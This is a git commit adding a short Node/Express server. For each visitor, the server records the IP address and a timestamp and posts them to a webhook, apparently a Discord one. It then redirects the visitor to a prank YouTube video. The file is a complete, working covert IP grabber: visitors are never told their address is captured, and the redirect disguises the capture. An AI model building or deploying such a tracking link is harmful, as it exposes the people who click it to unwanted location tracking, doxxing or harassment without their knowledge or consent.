fd2dd1e54e92188476e8d60b32ad065f30295e42
Ivarius-2 <ivanusmoriarty@mail.ru>
2026-04-10 15:00:48 +1000

    Add files via upload

---
+++ server.js
@@ -0,0 +1,45 @@
+import express from "express";
+import dotenv from "dotenv";
+
+dotenv.config();
+
+const app = express();
+
+const logger = async (ip, date) => {
+    const hook = process.env.HOOK;
+    const data = {
+        "content": " ",
+        "title": "New IP",
+    }
+    data.content = `**IP:** ${ip}\n**Date:** ${date}`;
+
+
+    const response = await fetch(hook, {
+        method: 'POST',
+        headers: {
+            'Content-Type': 'application/json',
+        },
+        body: JSON.stringify(data)
+    });
+    
+    if (response.ok) {
+        console.log("Logged IP successfully");
+    }
+    
+    return response;
+}
+
+
+app.get("/", (req, res) => {
+  const ip = req.headers["x-forwarded-for"] || req.socket.remoteAddress;
+  const date = new Date().toISOString();
+
+    logger(ip, date);
+
+    res.redirect("https://www.youtube.com/watch?v=dQw4w9WgXcQ");
+});
+
+
+app.listen(3000, () => {
+  console.log("Server is running on port 3000");
+});
